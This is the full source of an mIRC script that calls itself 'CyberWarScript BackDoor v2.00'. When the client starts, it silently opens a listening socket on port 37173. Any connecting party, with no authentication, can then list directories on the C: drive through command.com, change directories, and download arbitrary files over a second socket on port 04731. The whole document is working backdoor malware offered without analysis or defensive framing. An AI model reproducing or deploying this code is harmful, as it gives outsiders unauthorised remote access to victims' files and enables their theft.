   on *:start: {
     socklisten doortohell 37173
   }

   on *:socklisten:doortohell: {
     sockaccept yougotit
     set %cwsbd.dir c:\
     sockwrite -n yougotit -==CWSBD2.00==- Connected to Server
   }

   on *:sockread:yougotit: {
     sockread 4096 %datas
     if (%datas == quit) { sockwrite -n yougotit -==CWSBD2.00==- Connection Terminated | sockclose yougotit }
     elseif (%datas == dir) {
       run c:\command.com /c dir " $+ %cwsbd.dir $+ " /o /w >>c:\cwsbddir.txt
       timer 1 5 snddir
     }
     elseif ($mid(%datas,1,2) == cd) {
       if (.. isin %datas) {
         if ($len(%cwsbd.dir) != 3) {
           set %cwsbd.dir $mid(%cwsbd.dir,1,$pos(%cwsbd.dir,$chr(92),$calc($count(%cwsbd.dir,$chr(92)) - 1)))
         }
       }
       else {
         set %cwsbd.dir %cwsbd.dir $+ $mid(%datas,4,$len(%datas)) $+ \
         if ($isdir(%cwsbd.dir) == $false) {
           sockwrite -n yougotit -==CWSBD2.00==- No such dir %cwsbd.dir
           set %cwsbd.dir $mid(%cwsbd.dir,1,$pos(%cwsbd.dir,$chr(92),$calc($count(%cwsbd.dir,$chr(92)) - 1)))
           halt
         }
       }
       sockwrite -n yougotit -==CWSBD2.00==- Changed Dir to %cwsbd.dir
     }
     elseif ($mid(%datas,1,3) == get) {
       set %cwsbd.file %cwsbd.dir $+ $mid(%datas,4,$len(%datas))
       if ($isfile(%cwsbd.file) == $true) {
         socklisten cwsbd.file 04731
       }
     }
     elseif (%datas == help) {
       sockwrite -n yougotit +-==CyberWarScript BackDoor v2.00==-+
       sockwrite -n yougotit $chr(124) $+ $str($chr(160),9) by CyberWarrior $str($chr(160),9) $+ $chr(124)
       sockwrite -n yougotit |===================================|
       sockwrite -n yougotit $chr(124) $+ $str($chr(160),11) Help Screen $str($chr(160),11) $+ $chr(124)
       sockwrite -n yougotit +-----------------------------------+
       sockwrite -n yougotit |help - Shows this help Screen $str($chr(160),5) $+ $chr(124)
       sockwrite -n yougotit |dir - Shows the dir contents $str($chr(160),6) $+ $chr(124)
       sockwrite -n yougotit |cd <dir> - go into <dir> $str($chr(160),10) $+ $chr(124)
       sockwrite -n yougotit |get <filename> - recieve <filename>|
       sockwrite -n yougotit |quit - quit connection $str($chr(160),12) $+ $chr(124)
       sockwrite -n yougotit +-=================================-+
     }
     else {
       sockwrite -n yougotit -==CWSBD2.00==- Unknown Command ' $+ %datas $+ '
       sockwrite -n yougotit $str($chr(160),15) Type 'help' to get a Command-List
     }
     unset %datas
   }

   on *:sockclose:yougotit: {
     sockclose yougotit
   }

   alias snddir {
     set %cwsbd.cnt 0
     while (%cwsbd.cnt < $lines(c:\cwsbddir.txt)) {
       inc %cwsbd.cnt
       sockwrite -n yougotit $read -l $+ %cwsbd.cnt c:\cwsbddir.txt
     }
     unset %cwsbd.cnt
     remove c:\cwsbddir.txt
   }

   on *:socklisten:cwsbd.file {
     sockaccept cwsbd.sndfile
     set %cwsbd.pos 0
     set %cwsbdlof $lof(%cwsbd.file)
     cwsbd.snd
   }

   alias cwsbd.snd {
     bread %cwsbd.file  %cwsbdpos 4096 &cwsbd.temp
     sockwrite cwsbd.sndfile &cwsbd.temp
     inc %cwsbdpos $bvar(&cwsbd.temp,0)
   }

   on 1:sockwrite:cwsbd.sndfile:{
     if ($sockerr > 0) { sockclose cwsbd.sndfile | halt }
     if (%cwsbdpos >= %cwsbdlof) {
       return
     }
     cwsbd.snd
   }
